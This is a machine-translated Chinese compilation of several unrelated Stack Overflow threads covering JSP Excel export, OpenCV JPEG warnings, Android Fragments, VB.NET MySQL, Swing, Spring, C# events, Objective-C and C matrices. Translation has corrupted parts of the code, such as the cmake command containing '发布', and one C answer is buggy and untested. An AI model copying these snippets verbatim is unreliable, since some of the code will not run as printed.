我正在尝试向我的 jsp 页面添加一个导出按钮，它将表格数据导出到 Excel。该功能有效，但我的输出文件未显示正确的格式。还有另一种方法可以做到这一点我还需要一些可以在 IE 中使用的东西。

![在此处输入图像描述](../Images/97f11982aa69a21c4c991bc218b2c3e8.png)

见下文...帮助！

```
 <script Language="javascript">
  function ExportHTMLTableToExcel()
 {
 var thisTable = document.getElementById("myTable").innerHTML;
 window.clipboardData.setData("Text", thisTable);
 var objExcel = new ActiveXObject ("Excel.Application");
 objExcel.visible = true;

 var objWorkbook = objExcel.Workbooks.Add;
 var objWorksheet = objWorkbook.Worksheets(1);
 objWorksheet.Paste;
  }
 </script>

<table id="myTable" class="display">
<thead>
    <tr>
        <th>&nbsp;</th>
        <th> Bar Code </th>
        <th>Origin</th>

    </tr>
</thead>
<tbody>
    <c:forEach items="${summary}" var="summary">
        <tr>
    <td ><c:outvalue="${summary.eventDesc}" /></td>
    <td><a href="AnalysisController?value=${summary.labelNbr}"> <c:out
        value="${summary.labelNbr}" /> </a></td>
    <td><c:outvalue="${summary.origin}" /></td>

        </tr>
    </c:forEach>
</tbody>
 </table>

 <input type="button" onclick="ExportHTMLTableToExcel()"value="Export"> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:06:10.143

这是我在 IE 上工作的 JavaScript 代码。您可以根据需要更改格式。

```
function write_to_excel() 
{
    str="";
    var myTable = document.getElementById('myTable');
    var rows = myTable.getElementsByTagName('tr');
    var rowCount = myTable.rows.length;
    var colCount = myTable.getElementsByTagName("tr")[0].getElementsByTagName("th").length; 

    var ExcelApp = new ActiveXObject("Excel.Application");
    var ExcelWorkbook = ExcelApp.Workbooks.Add();
    var ExcelSheet = ExcelWorkbook.ActiveSheet;//new ActiveXObject("Excel.Sheet"); 
    //ExcelSheet.Application.Visible = true;
    ExcelApp.Visible = true;

    ExcelSheet.Range("A1", "Z1").Font.Bold = true;
    ExcelSheet.Range("A1", "Z1").Font.ColorIndex = 23;     

    //Format table headers
    for(var i=0; i<1; i++) 
    {   
        for(var j=0; j<colCount-2; j++) 
        {           
            str= myTable.getElementsByTagName("tr")[i].getElementsByTagName("th")[j].innerHTML;
            ExcelSheet.Cells(i+1,j+1).Value = str;
        }
        ExcelSheet.Range("A1", "Z1").EntireColumn.AutoFit();
    }
    for(var i=1; i<rowCount; i++) 
    {
        for(var k=0; k<colCount-2; k++) 
        {
            str= rows[i].getElementsByTagName('td')[k].innerHTML;
            ExcelSheet.Cells(i+1,k+1).Value = myTable.rows[i].cells[k].innerText;
        }
        ExcelSheet.Range("A"+i, "Z"+i).WrapText = true;
        ExcelSheet.Range("A"+1, "Z"+i).EntireColumn.AutoFit();
    }

    //ExcelSheet.SaveAs("C:\\TEST.XLS");
    //ExcelSheet.Application.Quit();

    return; 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T20:02:26.290

使用MS Excel、OpenOffice 或 LibreOffice 等可读的[CSV](http://en.wikipedia.org/wiki/Comma-separated_values)格式...

**想象一下这张桌子：**

```
| H1 | H2 | H3 | H4 |

| x1 | x2 | x3 | x4 |

| y1 | y2 | y3 | y4 | 
```

**CSV 应该看起来像**

```
H1,H2,H3,H4
x1,x2,x3,x4
y1,y2,y3,y4 
```

-->**文件.csv**

我会编写一些简单的脚本，循环遍历每一行并写入以 . 分隔的值`,`。

我希望这就是你要找的

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-07-24T05:51:05.193

只需将 html 字符串传递给 htmlData 变量，有几个问题，比如它采用默认名称，当你打开 excel 时，它说格式无效，但数据格式正确。

```
var htmlData = "<some html tble string here />"; 
```

[http://jsfiddle.net/DYqXa/](http://jsfiddle.net/DYqXa/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-11-12T15:10:15.843

您正在导出表格的“内容”，而不是实际的表格标签本身。如果将表格放在 div 中，并导出 DIV 的内容，它应该可以按预期工作。

不过，只是其他一些注释。首先，您可以假设此代码不会在 IE 以外的浏览器中使用，因为它需要剪贴板访问权限。其次，您需要将`window.clipboardData.setData`部件移动到 Excel 对象被实例化后以覆盖较新版本的 Excel（不访问之前创建的剪贴板内容）。

```
<script Language="javascript">
    function ExportHTMLTableToExcel()
    {
       var thisTable = document.getElementById("myDiv").innerHTML;
       window.clipboardData.setData("Text", thisTable);
       var objExcel = new ActiveXObject ("Excel.Application");
       objExcel.visible = true;
       var objWorkbook = objExcel.Workbooks.Add;
       var objWorksheet = objWorkbook.Worksheets(1);
       objWorksheet.Paste;
    }
</script>

<div id="myDiv">
    <table id="myTable" class="display">
        <tr>
            <th>Col1</th>
            <th>Col2</th>
            <th>Col3</th>
        </tr>
        <tr>
            <td>1</td>
            <td>2</td>
            <td>3</td>
        </tr>
        <tr>
            <td>4</td>
            <td>5</td>
            <td>6</td>
        </tr>
    </table>
</div>

<input type="button" onclick="ExportHTMLTableToExcel()"value="Export"> 
```

# opencv - Ubuntu 网络摄像头 (Logitech C270) 捕获上的 Opencv 错误 -> HIGHGUI 错误：V4L/V4L2：VIDIOC_S_CROP

> ID：15533338
> 
> 赞同：11
> 
> 时间：2013-03-20T19:51:12.540
> 
> 标签：opencv, webcam, capture

此错误消息出现在使用罗技 C270 (OpenCV 2.4.2/C++) 在 Ubuntu 上运行简单的相机捕获时：

> HIGHGUI 错误：V4L/V4L2：VIDIOC_S_CROP

并进一步：

> 损坏的 JPEG 数据：标记 0xd1 之前的 2 个无关字节 损坏的 JPEG 数据：标记 0xd6 之前的 1 个无关字节 损坏的 JPEG 数据：标记 0xd0 之前的 1 个无关字节 损坏的 JPEG 数据：标记 0xd0 之前的 1 个无关字节

我得到了框架，但是在写入 Mat 对象时交换了框架宽度和高度的值，如下所示：

```
Mat frame;
videoCapture = new VideoCapture(camId);
if(!videoCapture->isOpened()) throw Exception();

cout << "Frame width: " << videoCapture->get(CV_CAP_PROP_FRAME_WIDTH) << endl;
cout << "Frame height: " << videoCapture->get(CV_CAP_PROP_FRAME_HEIGHT) << endl;

(*videoCapture) >> frame;

cout << "Mat width: " << frame.rows << endl;
cout << "Mat height: " << frame.cols << endl; 
```

输出：

```
Frame width: 640
Frame height: 480
Mat width: 480
Mat height: 640 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-06T15:05:45.413

如果您不想调试问题，并且您的网络摄像头的帧显示没有任何问题，您的选择是直接拍摄信使。如果您从源代码构建 OpenCV，而不是安装预构建的二进制文件，则以下说明有效。

开始`grep -R "Corrupt JPEG data" ~/src/opencv-2.4.4/`并深入兔子洞，直到找到你想要的东西。就我而言，罪魁祸首是`opencv-2.4.4/thirdparty/libjpeg/jdmarker.c:908`：

```
 if (cinfo->marker->discarded_bytes != 0) {
    WARNMS2(cinfo, JWRN_EXTRANEOUS_DATA, cinfo->marker->discarded_bytes, c);
    cinfo->marker->discarded_bytes = 0;
  } 
```

`WARNMS2`宏是导致打印有关无关数据的错误消息的原因。只需将其注释掉，重建 OpenCV 并继续您的工作。我也有一台 C270，运行 Ubuntu 12.04，并且在执行上述操作之前遇到了相同的唠叨错误消息。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-04-10T16:44:32.137

关于问题：

> 损坏的 JPEG 数据：标记 0xd1 之前的 2 个无关字节 损坏的 JPEG 数据：标记 0xd6 之前的 1 个无关字节 损坏的 JPEG 数据：标记 0xd0 之前的 1 个无关字节 损坏的 JPEG 数据：标记 0xd0 之前的 1 个无关字节

看起来，问题出在 libjpeg 库中。由于某些未知原因，它在 OpenCV 库下工作不正确。我尝试在不支持 JPEG 的情况下进行编译，它解决了这个问题。

cmake -D CMAKE_BUILD_TYPE=发布 -D CMAKE_INSTALL_PREFIX=/usr/local -D BUILD_SHARED_LIBS=OFF -D BUILD_EXAMPLES=OFF -D BUILD_TESTS=OFF -D BUILD_PERF_TESTS=OFF -D WITH_JPEG=OFF -D WITH_IPP=OFF ..

您可以在我的博客中找到所有详细信息：

[http://privateblog.by/linux/opencv-i-corrupt-jpeg-data-na-linux/](http://privateblog.by/linux/opencv-i-corrupt-jpeg-data-na-linux/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-21T16:53:19.397

图像的宽度由其列数给出。你的代码应该是

```
cout << "Mat width: " << frame.cols << endl;
cout << "Mat height: " << frame.rows << endl; 
```

所以宽度和高度之间没有交换。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-03-26T01:45:46.857

我会将此作为评论发布（没有足够的声誉），但我还是被困在这里，我发现的解决方案虽然不优雅，但是：

```
python my_app.py 2<&1 | grep -v "Corrupt JPEG data" 
```

注意：要复制我正在使用的正常 python 打印语句行为`os.system(f'echo {my_string}')`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-08-25T09:05:46.393

如果您只想快速摆脱输出并且`grep -v Corrupt`无法以某种方式工作 - 就像我一样 - 您也可以将 stderr 重定向到任何内容，例如

```
./my_app 2> /dev/null

python my_app.py 2> /dev/null 
```

这当然也会隐藏其他错误消息。

# android - Android Fragment 基础教程

> ID：15533343
> 
> 赞同：5
> 
> 时间：2013-03-20T19:51:30.480
> 
> 标签：android, fragment

所以几天来，我一直被困在[Android 开发者网站上关于 Fragments的第三个教程上。](http://developer.android.com/training/basics/fragments/index.html)当我在平板电脑（大屏幕布局）上运行应用程序时，我只是无法理解应用程序如何填充数据。我可以理解如何在较小的屏幕（电话屏幕）上填充数据。

更大的屏幕列表如何填充数据？

[这是来自Android.com](http://developer.android.com/shareables/training/FragmentBasics.zip)教程的整个项目的链接。

MainActivity 类

```
public class MainActivity extends FragmentActivity 
    implements HeadlinesFragment.OnHeadlineSelectedListener {

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //Here, the system will decide which news_article layout it will use based on the screen size. Will use layout if small or layout-large if it's big. 
        setContentView(R.layout.news_articles);

        // Check whether the activity is using the layout version with
        // the fragment_container FrameLayout. If so, we must add the first fragment
        //This check is to determine which layout to be used, either small screen or big screen.
        //fragment_container used FrameLayout for small screens.
        //fragment_container is the id of FrameLayout in news_article for small screen. 
        if (findViewById(R.id.fragment_container) != null) {

            // However, if we're being restored from a previous state,
            // then we don't need to do anything and should return or else
            // we could end up with overlapping fragments.
            if (savedInstanceState != null) {
                return;
            }

            // Create an instance of ExampleFragment
            HeadlinesFragment firstFragment = new HeadlinesFragment();

            // In case this activity was started with special instructions from an Intent,
            // pass the Intent's extras to the fragment as arguments
             firstFragment.setArguments(getIntent().getExtras());

            // Add the fragment to the 'fragment_container' FrameLayout
            getSupportFragmentManager().beginTransaction()
                    .add(R.id.fragment_container, firstFragment).commit();
        }
    }

    public void onArticleSelected(int position) {
        // The user selected the headline of an article from the HeadlinesFragment

        // Capture the article fragment from the activity layout
        ArticleFragment articleFrag = (ArticleFragment)
            getSupportFragmentManager().findFragmentById(R.id.article_fragment);

        if (articleFrag != null) {
            // If article frag is available, we're in two-pane layout...

            // Call a method in the ArticleFragment to update its content
            articleFrag.updateArticleView(position);

        } else {
            // If the frag is not available, we're in the one-pane layout and must swap frags...

            // Create fragment and give it an argument for the selected article
            ArticleFragment newFragment = new ArticleFragment();
            Bundle args = new Bundle();
            args.putInt(ArticleFragment.ARG_POSITION, position);
            newFragment.setArguments(args);
            FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();

            // Replace whatever is in the fragment_container view with this fragment,
            // and add the transaction to the back stack so the user can navigate back
            transaction.replace(R.id.fragment_container, newFragment);
            transaction.addToBackStack(null);

            // Commit the transaction
            transaction.commit();
        }
    }
} 
```

* * *

标题片段

```
public class HeadlinesFragment extends ListFragment {

// The container Activity must implement this interface so the frag can deliver messages
    public interface OnHeadlineSelectedListener {
        /** Called by HeadlinesFragment when a list item is selected */
        public void onArticleSelected(int position);
    }

    OnHeadlineSelectedListener mCallback;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // We need to use a different list item layout for devices older than Honeycomb
        int layout = Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB ?
            android.R.layout.simple_list_item_activated_1 : android.R.layout.simple_list_item_1;

        // Create an array adapter for the list view, using the Ipsum headlines array
        setListAdapter(new ArrayAdapter<String>(getActivity(), layout, Ipsum.Headlines));

    }

    @Override
    public void onStart() {
        super.onStart();

        // When in two-pane layout, set the listview to highlight the selected list item
        // (We do this during onStart because at the point the listview is available.)
        if (getFragmentManager().findFragmentById(R.id.article_fragment) != null) {
            getListView().setChoiceMode(ListView.CHOICE_MODE_SINGLE);
        }
    }

    @Override
    public void onAttach(Activity activity) {
        super.onAttach(activity);

        // This makes sure that the container activity has implemented
        // the callback interface. If not, it throws an exception.
        try {
            mCallback = (OnHeadlineSelectedListener) activity;
        } catch (ClassCastException e) {
            throw new ClassCastException(activity.toString()
                    + " must implement OnHeadlineSelectedListener");
        }
    }

    @Override
    public void onListItemClick(ListView l, View v, int position, long id) {
        // Notify the parent activity of selected item
        mCallback.onArticleSelected(position);

        // Set the item as checked to be highlighted when in two-pane layout
        getListView().setItemChecked(position, true);
    }
} 
```

* * *

**小屏** news_article.xml的布局

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/fragment_container"
    android:layout_width="match_parent"
    android:layout_height="match_parent" /> 
```

* * *

**大屏幕news_article.xml**的布局****

 **```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="horizontal" >

    <fragment android:name="com.example.android.fragments.HeadlinesFragment"
              android:id="@+id/headlines_fragment"
              android:layout_weight="1"
              android:layout_width="0dp"
              android:layout_height="match_parent" />

    <fragment android:name="com.example.android.fragments.ArticleFragment"
              android:id="@+id/article_fragment"
              android:layout_weight="2"
              android:layout_width="0dp"
              android:layout_height="match_parent" />

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T19:59:53.757

注意两个布局的位置。

大屏幕位于平板电脑箱（文件夹）`res/layout-large/main.xml`中，而小屏幕布局位于通用中`res/layout/main.xml`

由于 java 询问 findViewById 是否为 null，我们知道设备是大屏幕还是普通布局。

```
 ArticleFragment articleFrag = (ArticleFragment) getSupportFragmentManager().findFragmentById(R.id.article_fragment);
    if (articleFrag != null) { 
        /* not null because we are in res/layout-large */
    } else {
        /* we are in single pain view /res/layout/... */
    } 
```

当您调用`setContentView(int);`它们时，系统会根据提供的 DPI bin 加载您为设备提供的最佳布局。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-01T12:45:34.653

我认为，这个问题与这篇文章有关：http: [//developer.android.com/training/multiscreen/screensizes.html](http://developer.android.com/training/multiscreen/screensizes.html)

注意：**large** qualifier 表示将在屏幕分类为大的设备（例如，7" 平板电脑及以上）上选择布局。对于较小的设备，将选择其他布局（没有限定符）；

此外，如果您想用于小屏幕两窗格布局，请创建目录：res/layout-sw600dp/main.xml；

关于数据填充：在MainActivity中你已经实现了接口OnHeadlineSelectedListener，当你点击列表中的项目时（HeadLinesFragment类）
接口mCallback从MainActivity调用函数onArticleSelected(position);

在这个函数中你有 articleFlag

ArticleFragment articleFlag = (ArticleFragment) getSupportFragmentManager()。findFragmentById(R.id.article_fragment);

```
 if(articleFlag != null){
        //we have 2 panes (big screen)
articleFlag.updateArticleView(position);

    }else{
        //small screen 
       ArticleFragment newFragment = new ArticleFragment();
        Bundle args = new Bundle();
        args.putInt(ArticleFragment.ARG_POSITION, position);
        newFragment.setArguments(args);
        FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();

        // Replace whatever is in the fragment_container view with this fragment,
        // and add the transaction to the back stack so the user can navigate back
        transaction.replace(R.id.fragment_container, newFragment);
        transaction.addToBackStack(null);

        //Commit the transaction 
        transaction.commit(); 
```

}**

# mysql - 查询不返回所有记录，需要所有记录

> ID：15533345
> 
> 赞同：0
> 
> 时间：2013-03-20T19:51:32.910
> 
> 标签：mysql, vb.net, mysqldatareader

我已经编写了一些代码来从我的数据库中检索 3 个单独的列，但由于某种原因，它没有加载我的查询产生的所有记录。
或者好吧，至少它似乎没有这样做。

此外，由于某种原因，它不会向我显示一个消息框，该消息框应该告诉我在阅读器关闭后已阅读了多少条记录。

这是我的代码：

```
Public Class frmPlayerLocations
    Dim str(2), loc As String
    Dim xx, yy As Integer
    Dim itm As ListViewItem
    Private Sub frmPlayerLocations_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ListView1.Columns.Add("ID", 60, HorizontalAlignment.Left)
        ListView1.Columns.Add("Name", 115, HorizontalAlignment.Left)
        ListView1.Columns.Add("Approximate Location", 115, HorizontalAlignment.Left)

        Dim qry = "SELECT profile.unique_id, profile.name, survivor.worldspace FROM profile, survivor WHERE survivor.unique_id = profile.unique_id AND survivor.is_dead = '0' ORDER BY profile.name"
        Dim connection As MySqlConnection
        connection = New MySqlConnection()
        connection.ConnectionString = "Host=" & adminPanel.IP & ";port=" & adminPanel.port & ";user=" & adminPanel.username & ";password=" & adminPanel.password & ";database=" & adminPanel.DBname & ";"
        connection.Open()
        Dim cmd As New MySqlCommand(qry, connection)
        Dim reader As MySqlDataReader = cmd.ExecuteReader()
        Dim count As Integer = 0
        While reader.Read()
            count += 1
            str(0) = reader.GetString(0)
            str(1) = reader.GetString(1)
            loc = reader.GetString(2)
            loc = Mid(loc, loc.IndexOf(",") + 3)
            xx = CInt(Replace(Mid(loc, 1, loc.IndexOf(",")), ".", ",", 1, -1, CompareMethod.Text))
            xx = (xx / 10000)
            loc = Mid(loc, loc.IndexOf(",") + 2)
            yy = CInt(Replace(Mid(loc, 1, loc.IndexOf(",")), ".", ",", 1, -1, CompareMethod.Text))
            yy = 152 - (yy / 10000)
            If xx < 100 Then
                If xx < 10 Then
                    loc = "00" & xx.ToString & " | "
                Else
                    loc = "0" & xx.ToString & " | "
                End If
            Else : loc = xx.ToString & " | "
            End If
            If yy < 100 Then
                If yy < 10 Then
                    loc &= "00" & yy.ToString
                Else
                    loc &= "0" & yy.ToString
                End If
            Else : loc &= yy.ToString
            End If
            str(2) = loc
            itm = New ListViewItem(str)
            ListView1.Items.Add(itm)
        End While
        reader.Close()
        connection.Close()
        MessageBox.Show(count)

    End Sub
End Class 
```

编辑：我注意到当连续两次调用表单时，我第二次收到此错误：

> Microsoft.VisualBasic.dll 中出现“System.ArgumentException”类型的未处理异常附加信息：参数“长度”必须大于或等于零。

它指的是这行代码：

`yy = CInt(Replace(Mid(loc, 1, loc.IndexOf(",")), ".", ",", 1, -1, CompareMethod.Text))`

最后但并非最不重要的是，该行代码中使用的值：

```
 loc "7.305e-04]]"   String
    yy  131 Integer 
```

PS：这可能会有所帮助：survivor.worldspace 中的值最初采用以下格式：

> [168,[1291.16,5343.54,0.27]]

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:53:41.040

如果没有显示消息框，那么最有可能的情况是在 while 循环内引发了异常，该异常可能在其他地方被静默捕获。

不幸的是，有太多地方可能会在该 while 循环中发生异常，因此仅查看该代码很难说。它可能试图将 a 强制转换`DBNull`为字符串，或者索引越界等。

我的建议是使用调试器单步执行并识别有问题的行，或者在 while 循环中放置一个 try catch 并在 catch 中放置一个断点。这应该为您提供有关异常发生的内容（和位置）的信息。

根据您的更新，问题似乎是传递给`Mid()`函数的参数。根据您的数据，您似乎正在尝试获取`loc`使用 1 的起始索引和**-1**的结束索引的子字符串，这是在这种情况下返回的`loc.IndexOf(",")`，因为.`,``loc`

您可能想稍微重构一下该代码。特别是看起来您实际上是在尝试替换`.`为，`,`但在尝试调用`Mid()`. 这似乎是你的问题！

# java - 通过为 JButton 着色的俄罗斯方块 GUI。渲染问题

> ID：15533348
> 
> 赞同：1
> 
> 时间：2013-03-20T19:52:01.660
> 
> 标签：java, swing, user-interface, jbutton, tetris

我正在制作一个俄罗斯方块游戏，对于我的 GUI，我选择为 JButtons 着色以用作我的俄罗斯方块板。我设置了一个 JButton 网格。我计划遍历从返回的俄罗斯方块网格

```
newGrid = game.gamePlay(oldGrid); 
```

并根据每个网格元素中的整数为每个 JButton 着色。返回的俄罗斯方块网格是一个整数数组，每个数字代表一种颜色。到目前为止，我没有用户交互，我只是想拥有基本的 GUI，其中块直接下降。

```
final JPanel card3 = new JPanel();
// Tetris setup
JButton startGame = new JButton("START GAME");
card3.setLayout(new GridBagLayout());
GridBagConstraints gbc2 = new GridBagConstraints();
gbc.gridx = 0;
gbc.gridy = 0;
gbc.insets = new Insets(2, 2, 2, 2);
card3.add(startGame, gbc2);
gbc.gridy = 1;
startGame.addActionListener(new ActionListener() {
    @Override
    public void actionPerformed(ActionEvent e) {
    card3.remove(0); //remove start button

    Game game = new Game();
    int[][] oldGrid = null;
    int[][] newGrid = null;
    boolean firstTime = true;

    JButton[][] grid; // tetris grid of buttons
    card3.setLayout(new GridLayout(20, 10));
    grid = new JButton[20][10];
    for (int i = 0; i < 20; i++) {
        for (int j = 0; j < 10; j++) {
            grid[i][j] = new JButton();
            card3.add(grid[i][j]);
        }
    }               

    while (true) {
            if (firstTime) {
                newGrid = game.gamePlay(null);
            } else {
                newGrid = game.gamePlay(oldGrid);
            }

            //Coloring Buttons based on grid

            oldGrid = newGrid;
            firstTime = false;
            card3.revalidate();
        }
    }
}); 
```

这是来自 Game 类的代码

```
public class Game
{
    static Tetris game;

    public int[][] gamePlay(int[][] grid) {
        if (grid == null) {
            game = new Tetris();
            System.out.println("first time");
        }
        else {
                game.setGrid(grid);
            }
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        game.move_Down();
        game.print_Game();

        return game.getGrid();
    }
} 
```

game.print_Game(); 将网格打印到控制台窗口，以便我可以从文本中看到正在发生的事情。但是 card3.revalidate(); 似乎没有工作，因为 GUI 在打印开始时暂停。如果我将 revalidate 移到 while 循环之前，然后注释掉 while 循环，则 GUI 输出：

![在此处输入图像描述](../Images/548224f4a7bdd563382171ea9128fff4.png)

这就是我想要的。但是为了给按钮着色某种颜色，我需要在网格更改时在 while 循环中进行重新验证。

有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T20:00:09.340

1.  使用`GridLayout`（更简单`LayoutManager`）代替`GridBagLayout`

2.  使用`Swing Timer`而不是`Runnable#Thread`

3.  `while (true) {`是无限循环

4.  `Thread.sleep(1000);`可以冻结 Swing GUI 直到睡眠结束，无限循环`Thread.sleep`可能导致不负责任的应用程序

5.  那里看不到`JButton.setBackground(somecolor)`

6.  使用 KeyBindings （添加到 to `JButtons container`）进行旋转

# java - 在 post-spring mvc 之后在内部重新发布表单

> ID：15533350
> 
> 赞同：1
> 
> 时间：2013-03-20T19:52:04.150
> 
> 标签：java, spring, jakarta-ee, spring-mvc

我`aMethod()`在控制器“A”中有一个方法，它通过 ajax 显示 html 并且是 POST BINDED。现在我想在其他控制器“B”中发布另一种方法后调用此方法。我的意思是我需要在发布后重新发布。我想在内部处理它，这样用户就不会觉得表单被发布了两次

对于 GET 渲染我可以做

`redirect:/persons`

POST 怎么办？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:00:35.693

如果您在调用控制器“B”中的方法时拥有所有需要调用`aMethod`服务器端的数据，只需将控制器“A”的引用注入控制器“B”并调用控制器“B”`aMethod`中方法的结尾”。

```
@Controller 
public class ControllerB {
    @Autowired
    private ControllerA controllerA;

    ....
    public Object bMethod() {
        // do whatever you need to here
        return controllerA.aMethod();
    } 
```

# c# - 在插件架构与单个应用程序中触发事件

> ID：15533362
> 
> 赞同：0
> 
> 时间：2013-03-20T19:52:58.857
> 
> 标签：c#, events, plugins, event-handling

我对我正在尝试针对事件开发的插件架构感到困惑。我可以在一个应用程序中很好地做到这一点：（显然这是我想要完成的一个非常简化的版本，如果这是我的代码，有更简单的方法来完成这个，只需尝试遵循逻辑；）

```
public Form1()
{
    public event EventHandler OnValueOver5Chars;

    Main()
    {
        OnValueOver5Chars+= new EventHandler(WarnUser);
        ....
    }

    private void textBox_Changed( object sender, EventArgs e )
    {
        if( sender.Text.count() > 5 )
            OnValueOver5Chars(sender, e); // WORKS HERE
    }

    private void WarnUser(object sender, EventArgs e)
    {
        ...
    }
} 
```

但是，现在我有一个插件架构，其中插件实现了一个包含我的事件的接口：

```
// Interface.cs
public interface IPlugin
{
    event EventHandler OnValueOver5Chars;
    ...
}

// Plugin1.cs
public class Plugin1 : IPlugin
{
    public event EventHandler OnValueOver5Chars;

    Plugin1()
    {
        OnValueOver5Chars += new EventHandler(Plugin1WarnUser);
    }

    private void Plugin1WarnUser(object sender, EventArgs e)
    {
        ...
    }
}

// Form.cs
public class Form1 : Form
{
    public Form1()
    {
        Assembly SampleAssembly = Assembly.LoadFrom("Plugin1.dll");
        Type myType = SampleAssembly.GetTypes()[0];
        if (myType.GetInterfaces().Contains(typeof(IPlugin)))
        {
            IPlugin myInstance = Activator.CreateInstance(myType) as IPlugin;
            myInstance.OnValueOver5Chars(this, new EventArgs());
            // Compiler Error CS0079 - The event 'event' can only appear on the left hand side of += or -=
        }
} 
```

？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T21:00:13.763

您试图将一个事件与另一个事件挂钩，但这是行不通的。您需要将插件事件挂钩到方法/委托。一旦你这样做了，让方法/委托调用另一个事件。

```
myInstance.OnValueOver5Chars += OnValueOver5CharsFunc;
...
/*In Form1*/
void OnValueOver5CharsFunc( object sender, EventArgs args )
{
    OnValueOver5Chars( sender, args );
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T21:04:44.047

C# 中的事件具有不能作为定义它们的类之外的方法（或委托等）直接“调用”的属性。

在您的第一个示例中，您从定义它的类中调用事件。但是，在第二个示例中，您尝试`OnValueOver5Chars`从类外部调用 - 因此出现错误。

为了解决这个问题，您可以考虑向您的`IPlugin`界面（例如`ValueOver5Chars`）添加一个执行`OnValueOver5Chars`. 请注意，更常见的是命名事件`ValueOver5Chars`（例如），并提供一种方法`OnValueOver5Chars`来引发它（即反过来）。例如，参见 Windows 窗体按钮[类](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.click.aspx)及其`Click`事件。

# ios - Objective C 递归调用

> ID：15533364
> 
> 赞同：4
> 
> 时间：2013-03-20T19:53:04.763
> 
> 标签：ios, objective-c, recursion

我试图在相机拍照之前不断检查加速度计的读数。我有一个拍照功能，在该功能开始时，我检查加速度计读数是否太高。如果是，我想再次调用该函数以检查加速是否停止。

```
- (void)takePicture {

    if (accelerating == YES) {
        [self takePicture];
    }

    else {
        // Code that takes picture
    }
} 
```

我想我遇到的问题是该函数被递归调用太多次，以至于我得到“EXC_BAD_ACCESS（代码= 2）”。如何解决这个递归调用问题？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-20T19:59:08.547

调用`[self takePicture]`它最终会*立即*重试，这是无用且浪费的，因为您甚至没有给您的应用程序任何时间来接收额外的加速度计事件。`accelerating`在你用完堆栈之前，的值可能永远不会改变。

您可能想要在这里做的是在几分之一秒后调用该方法，例如

```
[self performSelector: @selector(takePicture) withObject:nil afterDelay: 0.01];
return; 
```

这将使事件循环在 10 毫秒（0.01 秒）后再次调用您的方法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-20T19:57:42.387

实现这一点的一种潜在更好的方法是覆盖 setter 以加速到如下所示：

```
- (void)setAccelerating:(BOOL)accelerating {
    _accelerating = accelerating;
    if (accelerating) // maybe some more conditions, but you get the idea
        [self takePicture];
} 
```

# c - 在 C 中定义一个函数以从用户那里获取 2D 矩阵的元素

> ID：15533365
> 
> 赞同：0
> 
> 时间：2013-03-20T19:53:06.547
> 
> 标签：c, function, matrix

我无法完成此代码，请帮助我！我必须矩阵，程序读取函数中的矩阵项

```
int main(int argc, char *argv[])
{ 
   int r1,c1;
   printf("Enter dimension of first matrix :");
   scanf("%d %d",&r1,&c1);

   int m1[r1][c1];
   GetArray(m1,r1,c1);

   system("PAUSE"); 
   return 0;
}
void GetArray(int arr[][],int _row,int _column)
{
    int i,j,num;
    printf("Enter number: ");
    for(i==0;i<_row;i++){
        for(j==0;j< _column;j++){
           scanf("%d",&num);
           arr[i][j]=num;}} //give error in this line
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:03:36.757

在 C 编程中，`==`用于比较和`=`赋值操作。您肯定希望在循环`j`中分配值。在您的情况下，您没有初始化循环变量（当您在函数开头声明它们时），并且由于它们在未初始化时会得到垃圾值，因此您尝试超出您在循环，从而得到分段错误。`i``for``for`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-02T16:33:21.127

```
int main(int argc, char *argv[])
{ 
    int r1,c1;
    printf("Enter dimension of first matrix :");
    scanf("%d %d",&r1,&c1);
    int **m1;
    for(int i = 0; i<r1 ;++i) // use c99 !
        m1[i] = malloc(c1* sizeof(int));
    GetArray(m1,r1,c1);
    system("PAUSE");
    for(int i = 0; i<r1 ;++i)
        free(m1[i]);
    return 0;
}
void GetArray(int ** m1,int _row,int _column)
{
    int i,j,num;
    printf("Enter number: ");
    for(i=0;i<_row;i++){
        for(j=0;j< _column;j++){
           scanf("%d",&num);
           m1[i][j]=num;}} //give error in this line
} 
```

未经测试

# algorithm - 更快的计算以获得不同级别的多个数字

> ID：15533370
> 
> 赞同：0
> 
> 时间：2013-03-20T19:53:23.797
> 
> 标签：algorithm, excel, vba

这是场景：

我们有几件商品被运送到许多商店。我们希望能够根据需要为商店分配一定数量的每件商品。这些商店中的每一个也与特定的仓库相关联。

问题是在**仓库**级别，每个项目的总数量必须是数字的倍数（例如 6）。

我已经计算出每个商店在**商店级别所需的数量，但在****仓库**级别上它们的总和不等于 6 的倍数。

